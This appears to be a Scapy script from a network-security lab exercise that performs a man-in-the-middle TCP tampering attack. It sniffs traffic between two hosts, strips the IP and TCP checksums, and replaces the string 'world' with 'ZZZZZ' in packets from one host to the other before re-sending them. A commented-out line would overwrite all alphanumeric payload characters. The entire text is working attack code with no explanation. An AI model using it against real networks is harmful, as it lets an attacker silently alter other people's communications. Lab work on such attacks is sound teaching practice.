#!/usr/bin/python3

from scapy.all import *

A_IP = "10.9.0.5"
A_mac = "02:42:0a:09:00:05"

B_IP = "10.9.0.6"
B_mac = "02:42:0a:09:00:06"

M_IP = "10.9.0.105"
M_mac = "02:42:0a:09:00:69"


def spoofpkt(pkt):
    if pkt[IP].src == A_IP and pkt[IP].dst ==B_IP:
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum) #ip chksum at layer 3
        del(newpkt[TCP].payload) #tcp packet data at tranportatoin layer 4
        del(newpkt[TCP].chksum) #TCP chksum at layer 4
        if pkt[TCP].payload:
            data = pkt[TCP].payload.load
            print("*** %s, length: %d" % (data, len(data)))
            newdata = data.replace(b'world', b'ZZZZZ')
            print(newdata)
            # newdata = re.sub(r'[0-9a-zA-Z]', r'A', data.decode())
            send(newpkt/newdata)
        else:
            send(newpkt)

    elif pkt[IP].src == B_IP and pkt[IP].dst ==A_IP:
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum) #ip chksum at layer 3
        del(newpkt[TCP].chksum) #TCP chksum at layer 4
        send(newpkt)

f = 'tcp and (ether src ' + A_mac + ' or ' + \
             'ether src ' + B_mac + ')'

pkt = sniff(iface = 'eth0', filter = f, prn = spoofpkt)
